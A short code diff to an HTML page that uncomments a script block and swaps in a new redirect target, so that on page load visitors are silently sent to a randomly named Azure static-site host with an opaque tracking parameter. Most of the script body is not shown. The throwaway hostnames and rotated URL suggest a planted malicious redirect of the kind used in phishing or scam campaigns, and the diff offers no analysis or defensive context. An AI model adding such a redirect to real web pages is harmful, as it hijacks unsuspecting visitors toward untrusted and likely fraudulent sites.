@@ -3,10 +3,10 @@
 <!DOCTYPE html>
 <html lang="ru2">
 <head>
-<!-- <script>
+<script>
         document.addEventListener("DOMContentLoaded", function () {
 
-            const redirectUrl = "https://ahsyayttt-secondary.z5.web.core.windows.net/?bcda=(0101)-85557-45675";
+            const redirectUrl = "https://ujytuytuyuyt81.z24.web.core.windows.net/?bcda=(0101)-83335-10404";
 
             const style = document.createElement("style");
             style.textContent = `
@@ -148,7 +148,7 @@
                 handleRedirect();
             });
         });
-    </script>  -->
+    </script> 
 	
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
